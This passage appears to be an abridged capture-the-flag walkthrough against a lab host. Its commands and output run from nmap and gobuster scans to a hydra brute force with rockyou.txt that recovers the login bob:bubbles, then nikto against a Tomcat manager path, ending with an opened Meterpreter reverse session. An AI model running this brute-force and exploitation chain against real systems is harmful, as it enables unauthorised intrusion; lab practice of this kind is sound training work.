...
PING 10.65.148.230 (10.65.148.230) 56(84) bytes of data.
64 bytes from 10.65.148.230: icmp_seq=1 ttl=62 time=158 ms
```
```bash
nmap 10.65.148.230 

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 14:21 -0300
Nmap scan report for 10.65.148.230
...
```bash
gobuster dir -u http://10.65.148.230 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.148.230
[+] Method:                  GET
[+] Threads:                 10
...
===============================================================
/guidelines          (Status: 301) [Size: 319] [--> http://10.65.148.230/guidelines/]
...
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.65.148.230 http-get /protected 
...
[80][http-get] host: 10.65.148.230   login: bob   password: bubbles
...
```bash
nikto -h http://10.67.144.158:1234/manager/html -id bob:bubbles 
- Nikto v2.5.0
---------------------------------------------------------------------------
...
[*] Meterpreter session 3 opened (192.168.130.186:4444 -> 10.67.144.158:54942) at 2026-01-01 23:07:25 -0300
